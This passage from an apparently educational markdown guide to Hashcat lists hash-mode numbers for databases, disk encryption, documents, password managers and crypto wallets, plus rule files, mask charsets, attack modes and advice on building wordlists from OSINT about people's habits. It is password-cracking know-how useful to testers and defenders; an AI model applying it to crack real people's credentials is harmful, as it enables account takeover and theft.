| 24100 | MongoDB ServerKey SCRAM-SHA-1                                        | Database Server                       |
| 24200 | MongoDB ServerKey SCRAM-SHA-256                                      | Database Server                       |
|   12 | PostgreSQL                                                           | Database Server                       |
| 11100 | PostgreSQL CRAM (MD5)                                                | Database Server                       |
| 28600 | PostgreSQL SCRAM-SHA-256                                             | Database Server                       |
| 3100 | Oracle H: Type (Oracle 7+)                                           | Database Server                       |
|  112 | Oracle S: Type (Oracle 11+)                                          | Database Server                       |
| 12300 | Oracle T: Type (Oracle 12+)                                          | Database Server                       |
| 7401 | MySQL $A$ (sha256crypt)                                              | Database Server                       |
| 11200 | MySQL CRAM (SHA1)                                                    | Database Server                       |
|  200 | MySQL323                                                             | Database Server                       |
|  300 | MySQL4.1/MySQL5                                                      | Database Server                       |
| 8000 | Sybase ASE                                                           | Database Server                       |
| 8300 | DNSSEC (NSEC3)                                                       | FTP, HTTP, SMTP, LDAP Server          |
| 25900 | KNX IP Secure - Device Authentication Code                           | FTP, HTTP, SMTP, LDAP Server          |
| 16400 | CRAM-MD5 Dovecot                                                     | FTP, HTTP, SMTP, LDAP Server          |
| 1411 | SSHA-256(Base64), LDAP {SSHA256}                                     | FTP, HTTP, SMTP, LDAP Server          |
| 1711 | SSHA-512(Base64), LDAP {SSHA512}                                     | FTP, HTTP, SMTP, LDAP Server          |
| 24900 | Dahua Authentication MD5                                             | FTP, HTTP, SMTP, LDAP Server          |
| 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                              | FTP, HTTP, SMTP, LDAP Server          |
| 15000 | FileZilla Server >= 0.9.55                                           | FTP, HTTP, SMTP, LDAP Server          |
| 12600 | ColdFusion 10+                                                       | FTP, HTTP, SMTP, LDAP Server          |
| 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                                | FTP, HTTP, SMTP, LDAP Server          |
|  141 | Episerver 6.x < .NET 4                                               | FTP, HTTP, SMTP, LDAP Server          |
| 1441 | Episerver 6.x >= .NET 4                                              | FTP, HTTP, SMTP, LDAP Server          |
| 1421 | hMailServer                                                          | FTP, HTTP, SMTP, LDAP Server          |
|  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                             | FTP, HTTP, SMTP, LDAP Server          |
|  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                          | FTP, HTTP, SMTP, LDAP Server          |
| 7700 | SAP CODVN B (BCODE)                                                  | Enterprise Application Software (EAS)  |
| 7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                              | Enterprise Application Software (EAS)  |
| 7800 | SAP CODVN F/G (PASSCODE)                                             | Enterprise Application Software (EAS)  |
| 7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE                         | Enterprise Application Software (EAS)  |
| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                                  | Enterprise Application Software (EAS)  |
|  133 | PeopleSoft                                                           | Enterprise Application Software (EAS)  |
| 13500 | PeopleSoft PS_TOKEN                                                  | Enterprise Application Software (EAS)  |
| 21500 | SolarWinds Orion                                                     | Enterprise Application Software (EAS)  |
| 21501 | SolarWinds Orion v2                                                  | Enterprise Application Software (EAS)  |
|   24 | SolarWinds Serv-U                                                    | Enterprise Application Software (EAS)  |
| 8600 | Lotus Notes/Domino 5                                                 | Enterprise Application Software (EAS)  |
| 8700 | Lotus Notes/Domino 6                                                 | Enterprise Application Software (EAS)  |
| 9100 | Lotus Notes/Domino 8                                                 | Enterprise Application Software (EAS)  |
| 26200 | OpenEdge Progress Encode                                             | Enterprise Application Software (EAS)  |
| 20600 | Oracle Transportation Management (SHA256)                            | Enterprise Application Software (EAS)  |
| 4711 | Huawei sha1(md5($pass).$salt)                                        | Enterprise Application Software (EAS)  |
| 20711 | AuthMe sha256                                                        | Enterprise Application Software (EAS)  |
| 22400 | AES Crypt (SHA256)                                                   | Full-Disk Encryption (FDE)            |
| 27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                          | Full-Disk Encryption (FDE)            |
| 14600 | LUKS v1 (legacy)                                                     | Full-Disk Encryption (FDE)            |
| 29541 | LUKS v1 RIPEMD-160 + AES                                             | Full-Disk Encryption (FDE)            |
| 29542 | LUKS v1 RIPEMD-160 + Serpent                                         | Full-Disk Encryption (FDE)            |
| 29543 | LUKS v1 RIPEMD-160 + Twofish                                         | Full-Disk Encryption (FDE)            |
| 29511 | LUKS v1 SHA-1 + AES                                                  | Full-Disk Encryption (FDE)            |
| 29512 | LUKS v1 SHA-1 + Serpent                                              | Full-Disk Encryption (FDE)            |
| 29513 | LUKS v1 SHA-1 + Twofish                                              | Full-Disk Encryption (FDE)            |
| 29521 | LUKS v1 SHA-256 + AES                                                | Full-Disk Encryption (FDE)            |
| 29522 | LUKS v1 SHA-256 + Serpent                                            | Full-Disk Encryption (FDE)            |
| 29523 | LUKS v1 SHA-256 + Twofish                                            | Full-Disk Encryption (FDE)            |
| 29531 | LUKS v1 SHA-512 + AES                                                | Full-Disk Encryption (FDE)            |
| 29532 | LUKS v1 SHA-512 + Serpent                                            | Full-Disk Encryption (FDE)            |
| 29533 | LUKS v1 SHA-512 + Twofish                                            | Full-Disk Encryption (FDE)            |
| 13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
| 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 29411 | VeraCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
| 29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)                  | Full-Disk Encryption (FDE)            |
| 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
| 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
| 29451 | VeraCrypt SHA256 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29452 | VeraCrypt SHA256 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29453 | VeraCrypt SHA256 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                           | Full-Disk Encryption (FDE)            |
| 29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
| 29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
| 13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 29421 | VeraCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29422 | VeraCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29423 | VeraCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)                        | Full-Disk Encryption (FDE)            |
| 13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)                       | Full-Disk Encryption (FDE)            |
| 13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)                       | Full-Disk Encryption (FDE)            |
| 13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)            | Full-Disk Encryption (FDE)            |
| 13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
| 13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
| 29471 | VeraCrypt Streebog-512 + XTS 512 bit                                 | Full-Disk Encryption (FDE)            |
| 29472 | VeraCrypt Streebog-512 + XTS 1024 bit                                | Full-Disk Encryption (FDE)            |
| 29473 | VeraCrypt Streebog-512 + XTS 1536 bit                                | Full-Disk Encryption (FDE)            |
| 29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode                     | Full-Disk Encryption (FDE)            |
| 29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
| 29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
| 13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 29431 | VeraCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29432 | VeraCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29433 | VeraCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 23900 | BestCrypt v3 Volume Encryption                                       | Full-Disk Encryption (FDE)            |
| 16700 | FileVault 2                                                          | Full-Disk Encryption (FDE)            |
| 27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)                        | Full-Disk Encryption (FDE)            |
| 27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)                        | Full-Disk Encryption (FDE)            |
| 20011 | DiskCryptor SHA512 + XTS 512 bit                                     | Full-Disk Encryption (FDE)            |
| 20012 | DiskCryptor SHA512 + XTS 1024 bit                                    | Full-Disk Encryption (FDE)            |
| 20013 | DiskCryptor SHA512 + XTS 1536 bit                                    | Full-Disk Encryption (FDE)            |
| 22100 | BitLocker                                                            | Full-Disk Encryption (FDE)            |
| 12900 | Android FDE (Samsung DEK)                                            | Full-Disk Encryption (FDE)            |
| 8800 | Android FDE <= 4.3                                                   | Full-Disk Encryption (FDE)            |
| 18300 | Apple File System (APFS)                                             | Full-Disk Encryption (FDE)            |
| 6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
| 6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 29311 | TrueCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
| 29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 29321 | TrueCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29322 | TrueCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29323 | TrueCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 29331 | TrueCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29332 | TrueCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29333 | TrueCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 12200 | eCryptfs                                                             | Full-Disk Encryption (FDE)            |
| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                                        | Document                              |
| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                           | Document                              |
| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                           | Document                              |
| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                                        | Document                              |
| 25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass                  | Document                              |
| 10600 | PDF 1.7 Level 3 (Acrobat 9)                                          | Document                              |
| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                                    | Document                              |
| 9400 | MS Office 2007                                                       | Document                              |
| 9500 | MS Office 2010                                                       | Document                              |
| 9600 | MS Office 2013                                                       | Document                              |
| 25300 | MS Office 2016 - SheetProtection                                     | Document                              |
| 9700 | MS Office <= 2003 $0/$1, MD5 + RC4                                   | Document                              |
| 9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1                      | Document                              |
| 9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2                      | Document                              |
| 9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1                        | Document                              |
| 9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2                        | Document                              |
| 9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                                  | Document                              |
| 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)                        | Document                              |
| 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)                     | Document                              |
| 16200 | Apple Secure Notes                                                   | Document                              |
| 23300 | Apple iWork                                                          | Document                              |
| 6600 | 1Password, agilekeychain                                             | Password Manager                      |
| 8200 | 1Password, cloudkeychain                                             | Password Manager                      |
| 9000 | Password Safe v2                                                     | Password Manager                      |
| 5200 | Password Safe v3                                                     | Password Manager                      |
| 6800 | LastPass + LastPass sniffed                                          | Password Manager                      |
| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                          | Password Manager                      |
| 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode      | Password Manager                      |
| 23400 | Bitwarden                                                            | Password Manager                      |
| 16900 | Ansible Vault                                                        | Password Manager                      |
| 26000 | Mozilla key3.db                                                      | Password Manager                      |
| 26100 | Mozilla key4.db                                                      | Password Manager                      |
| 23100 | Apple Keychain                                                       | Password Manager                      |
| 11600 | 7-Zip                                                                | Archive                               |
| 12500 | RAR3-hp                                                              | Archive                               |
| 23800 | RAR3-p (Compressed)                                                  | Archive                               |
| 23700 | RAR3-p (Uncompressed)                                                | Archive                               |
| 13000 | RAR5                                                                 | Archive                               |
| 17220 | PKZIP (Compressed Multi-File)                                        | Archive                               |
| 17200 | PKZIP (Compressed)                                                   | Archive                               |
| 17225 | PKZIP (Mixed Multi-File)                                             | Archive                               |
| 17230 | PKZIP (Mixed Multi-File Checksum-Only)                               | Archive                               |
| 17210 | PKZIP (Uncompressed)                                                 | Archive                               |
| 20500 | PKZIP Master Key                                                     | Archive                               |
| 20510 | PKZIP Master Key (6 byte optimization)                               | Archive                               |
| 23001 | SecureZIP AES-128                                                    | Archive                               |
| 23002 | SecureZIP AES-192                                                    | Archive                               |
| 23003 | SecureZIP AES-256                                                    | Archive                               |
| 13600 | WinZip                                                               | Archive                               |
| 18900 | Android Backup                                                       | Archive                               |
| 24700 | Stuffit5                                                             | Archive                               |
| 13200 | AxCrypt 1                                                            | Archive                               |
| 13300 | AxCrypt 1 in-memory SHA1                                             | Archive                               |
| 23500 | AxCrypt 2 AES-128                                                    | Archive                               |
| 23600 | AxCrypt 2 AES-256                                                    | Archive                               |
| 14700 | iTunes backup < 10.0                                                 | Archive                               |
| 14800 | iTunes backup >= 10.0                                                | Archive                               |
| 8400 | WBB3 (Woltlab Burning Board)                                         | Forums, CMS, E-Commerce               |
| 2612 | PHPS                                                                 | Forums, CMS, E-Commerce               |
| 121 | SMF (Simple Machines Forum) > v1.1                                   | Forums, CMS, E-Commerce               |
| 3711 | MediaWiki B type                                                     | Forums, CMS, E-Commerce               |
| 4521 | Redmine                                                              | Forums, CMS, E-Commerce               |
| 24800 | Umbraco HMAC-SHA1                                                    | Forums, CMS, E-Commerce               |
| 11 | Joomla < 2.5.18                                                      | Forums, CMS, E-Commerce               |
| 13900 | OpenCart                                                             | Forums, CMS, E-Commerce               |
| 11000 | PrestaShop                                                           | Forums, CMS, E-Commerce               |
| 16000 | Tripcode                                                             | Forums, CMS, E-Commerce               |
| 7900 | Drupal7                                                              | Forums, CMS, E-Commerce               |
| 4522 | PunBB                                                                | Forums, CMS, E-Commerce               |
| 2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                              | Forums, CMS, E-Commerce               |
| 2611 | vBulletin < v3.8.5                                                   | Forums, CMS, E-Commerce               |
| 2711 | vBulletin >= v3.8.5                                                  | Forums, CMS, E-Commerce               |
| 25600 | bcrypt(md5($pass)) / bcryptmd5                                       | Forums, CMS, E-Commerce               |
| 25800 | bcrypt(sha1($pass)) / bcryptsha1                                     | Forums, CMS, E-Commerce               |
| 28400 | bcrypt(sha512($pass)) / bcryptsha512                                 | Forums, CMS, E-Commerce               |
| 21 | osCommerce, xt:Commerce                                              | Forums, CMS, E-Commerce               |
| 18100 | TOTP (HMAC-SHA1)                                                     | One-Time Password                     |
| 2000 | STDOUT                                                               | Plaintext                             |
| 99999 | Plaintext                                                            | Plaintext                             |
| 21600 | Web2py pbkdf2-sha512                                                 | Framework                             |
| 10000 | Django (PBKDF2-SHA256)                                               | Framework                             |
| 124 | Django (SHA-1)                                                       | Framework                             |
| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                                         | Framework                             |
| 19500 | Ruby on Rails Restful-Authentication                                 | Framework                             |
| 27200 | Ruby on Rails Restful Auth (one round, no sitekey)                   | Framework                             |
| 30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))                         | Framework                             |
| 30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))                   | Framework                             |
| 20200 | Python passlib pbkdf2-sha512                                         | Framework                             |
| 20300 | Python passlib pbkdf2-sha256                                         | Framework                             |
| 20400 | Python passlib pbkdf2-sha1                                           | Framework                             |
| 24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)                    | Private Key                           |
| 24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)                  | Private Key                           |
| 15500 | JKS Java Key Store Private Keys (SHA1)                               | Private Key                           |
| 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                                | Private Key                           |
| 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                                | Private Key                           |
| 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                            | Private Key                           |
| 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                                | Private Key                           |
| 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                                | Private Key                           |
| 23200 | XMPP SCRAM PBKDF2-SHA1                                               | Instant Messaging Service             |
| 28300 | Teamspeak 3 (channel hash)                                           | Instant Messaging Service             |
| 22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)                        | Instant Messaging Service             |
| 24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)                     | Instant Messaging Service             |
| 22301 | Telegram Mobile App Passcode (SHA256)                                | Instant Messaging Service             |
| 23 | Skype                                                                | Instant Messaging Service             |
| 29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))                     | Cryptocurrency Wallet                 |
| 26600 | MetaMask Wallet                                                      | Cryptocurrency Wallet                 |
| 21000 | BitShares v0.x - sha512(sha512_bin(pass))                            | Cryptocurrency Wallet                 |
| 28501 | Bitcoin WIF private key (P2PKH), compressed                          | Cryptocurrency Wallet                 |
| 28502 | Bitcoin WIF private key (P2PKH), uncompressed                        | Cryptocurrency Wallet                 |
| 28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed                 | Cryptocurrency Wallet                 |
| 28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed               | Cryptocurrency Wallet                 |
| 28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed                   | Cryptocurrency Wallet                 |
| 28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed                 | Cryptocurrency Wallet                 |
| 11300 | Bitcoin/Litecoin wallet.dat                                          | Cryptocurrency Wallet                 |
| 16600 | Electrum Wallet (Salt-Type 1-3)                                      | Cryptocurrency Wallet                 |
| 21700 | Electrum Wallet (Salt-Type 4)                                        | Cryptocurrency Wallet                 |
| 21800 | Electrum Wallet (Salt-Type 5)                                        | Cryptocurrency Wallet                 |
| 12700 | Blockchain, My Wallet                                                | Cryptocurrency Wallet                 |
| 15200 | Blockchain, My Wallet, V2                                            | Cryptocurrency Wallet                 |
| 18800 | Blockchain, My Wallet, Second Password (SHA256)                      | Cryptocurrency Wallet                 |
| 25500 | Stargazer Stellar Wallet XLM                                         | Cryptocurrency Wallet                 |
| 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256                         | Cryptocurrency Wallet                 |
| 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                                  | Cryptocurrency Wallet                 |
| 15700 | Ethereum Wallet, SCRYPT                                              | Cryptocurrency Wallet                 |
| 22500 | MultiBit Classic .key (MD5)                                          | Cryptocurrency Wallet                 |
| 27700 | MultiBit Classic .wallet (scrypt)                                    | Cryptocurrency Wallet                 |
| 22700 | MultiBit HD (scrypt)                                                 | Cryptocurrency Wallet                 |
| 28200 | Exodus Desktop Wallet (scrypt)                                       | Cryptocurrency Wallet                 |

</details>

<details>
<summary><h3>Hashcat Rules</h3></summary>

| Rule File                          | Description                                                                 |
|------------------------------------|-----------------------------------------------------------------------------|
| `best64.rule`                     | Contains 64 of the most effective password mutation rules                   |
| `combinator.rule`                 | Combines words from two dictionaries (pairwise combinations)                |
| `d3ad0ne.rule`                    | Extensive rule set with complex transformations (origin unknown)            |
| `dive.rule`                       | Very large rule set with deep mutation patterns                             |
| `generated.rule`                  | Automatically generated rule set (basic version)                            |
| `generated2.rule`                 | Expanded version of generated.rule with more variations                     |
| `Incisive-leetspeak.rule`         | Advanced leet speak substitutions (e.g., a->4, e->3, etc.)                  |
| `InsidePro-HashManager.rule`      | Rule set from InsidePro's HashManager tool                                  |
| `InsidePro-PasswordsPro.rule`     | Rule set from InsidePro's PasswordsPro tool                                 |
| `leetspeak.rule`                  | Basic leet speak character substitutions                                    |
| `oscommerce.rule`                 | Specific rules targeting osCommerce password patterns                       |
| `rockyou-30000.rule`              | Rule set derived from patterns in the rockyou.txt password list             |
| `specific.rule`                   | Targeted rules for specific password mutation scenarios                     |
| `T0XlC*` rules                    | Comprehensive rule sets with various insertion patterns (numbers, specials) |
| `toggles1.rule`                   | Simple case toggle rules (minimal changes)                                  |
| `toggles2-5.rule`                 | Progressively more complex case toggle combinations                         |
| `unix-ninja-leetspeak.rule`       | Advanced leet speak rules from Unix-Ninja                                   |

> **NOTE:** : Hybrid rules are in the `/hybrid` subdirectory and combine multiple rule types

</details>

<details>
<summary><h3>Hashcat Masks</h3></summary>

| Symbol | Charset Description                     | Example Characters                     |
|--------|-----------------------------------------|----------------------------------------|
| `?l`   | Lowercase ASCII letters                 | abcdefghijklmnopqrstuvwxyz            |
| `?u`   | Uppercase ASCII letters                 | ABCDEFGHIJKLMNOPQRSTUVWXYZ            |
| `?d`   | Digits                                  | 0123456789                            |
| `?h`   | Lowercase hexadecimal digits            | 0123456789abcdef                      |
| `?H`   | Uppercase hexadecimal digits            | 0123456789ABCDEF                      |
| `?s`   | Special characters                      | !"#$%&'()*+,-./:;<=>?@[]^_\`{|}~   |
| `?a`   | All printable ASCII (lower+upper+digits+special) | Equivalent to `?l?u?d?s`       |
| `?b`   | All possible byte values (0x00-0xff)    | Non-printable characters included      |

</details>

<details>
<summary><h3>Hashcat Attack Modes</h3></summary>

| Mode | Attack Name          | Description                                                                 |
|------|----------------------|-----------------------------------------------------------------------------|
| 0    | Straight/Dictionary  | Uses words from a dictionary file without modification                      |
| 1    | Combination          | Combines words from multiple dictionaries (pairwise concatenation)          |
| 3    | Brute-Force/Mask     | Generates passwords based on character sets and position patterns           |
| 4    | Rule-Based           | Applies transformation rules to dictionary words (deprecated in v7+)        |
| 5    | Markov-Chain         | Uses statistical models to generate password candidates (deprecated)        |
| 6    | Hybrid Dict+Mask     | Appends mask patterns to each word from a dictionary                        |
| 7    | Hybrid Mask+Dict     | Prepends mask patterns to each word from a dictionary                       |
| 8    | Prince               | PRobability INfinite Chained Elements attack (advanced combinatorics)       |
| 9    | Association          | Uses contextual information (like usernames) to generate attack rules       |

1. **Most Common Attacks**: Modes 0 (dictionary) and 3 (mask) are most frequently used
2. **Hybrid Attacks**: Modes 6 and 7 combine dictionary and mask approaches
3. **Deprecated Modes**: Modes 4 and 5 were replaced by more efficient implementations
4. **Prince Attack**: Mode 8 generates probabilistic chains of dictionary fragments

</details>

</details>

<details>
<summary><h2>Writing Custom Wordlists and Rules</h2></summary>

Many users create their passwords based on simplicity rather than security.

Most people tend to follow predictable patterns when creating passwords. They often:

- Use words related to the service or platform (e.g., including the company's name for work-related accounts).
- Incorporate personal interests or elements from daily life.
- Choose passwords no longer than ten characters (according to statistics provided by [WP Engine](https://wpengine.com/resources/passwords-unmasked-infographic/)).

Common sources of inspiration include:

- **Pets** – names like "fluffy123" or "rex_the_dog"
- **Friends or Family** – nicknames or birth years
- **Sports** – favorite teams, player numbers, or sports terminology
- **Hobbies** – gaming aliases, instruments, or favorite books
- **Pop culture** – movie titles, characters, or song lyrics

Even basic OSINT (Open Source Intelligence) techniques can uncover this kind of personal information, which can be leveraged to guess or crack passwords effectively.

Commonly, users use the following additions for their password to fit the most common password policies:

| **Description**                         | **Password Syntax**     |
|----------------------------------------|--------------------------|
| First letter is uppercase              | `Password`               |
| Adding numbers                         | `Password123`            |
| Adding year                            | `Password2022`           |
| Adding month                           | `Password02`             |
| Last character is an exclamation mark  | `Password2022!`          |
| Adding special characters              | `P@ssw0rd2022!`          |

<details>
<summary><h3>Generating Wordlists using Hashcat</h3></summary>

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations.

| **Name**             | **Function** | **Description**                                          | **Example Rule** | **Input Word** | **Output Word**        |
|----------------------|--------------|----------------------------------------------------------|------------------|----------------|-------------------------|
| Nothing              | :            | Do nothing (passthrough)                                | :                | p@ssW0rd       | p@ssW0rd               |
| Lowercase            | l            | Lowercase all letters                                   | l                | p@ssW0rd       | p@ssw0rd               |
| Uppercase            | u            | Uppercase all letters                                   | u                | p@ssW0rd       | P@SSW0RD               |
| Capitalize           | c            | Capitalize first character, lowercase the rest          | c                | p@ssW0rd       | P@ssw0rd               |
| Invert Capitalize    | C            | Lowercase first character, uppercase the rest           | C                | p@ssW0rd       | p@SSW0RD               |
| Toggle Case          | t            | Toggle the case of all characters                       | t                | p@ssW0rd       | P@SSw0RD               |
| Toggle @ N           | TN           | Toggle case at position N                               | T3               | p@ssW0rd       | p@sSW0rd               |
| Reverse              | r            | Reverse the entire word                                 | r                | p@ssW0rd       | dr0Wss@p               |
| Duplicate            | d            | Duplicate entire word                                   | d                | p@ssW0rd       | p@ssW0rdp@ssW0rd       |
| Duplicate N          | pN           | Append duplicated word N times                          | p2               | p@ssW0rd       | p@ssW0rdp@ssW0rdp@ssW0rd |
| Reflect              | f            | Duplicate word reversed                                 | f                | p@ssW0rd       | p@ssW0rddr0Wss@p       |
| Rotate Left          | {            | Rotate the word left                                    | {                | p@ssW0rd       | @ssW0rdp               |
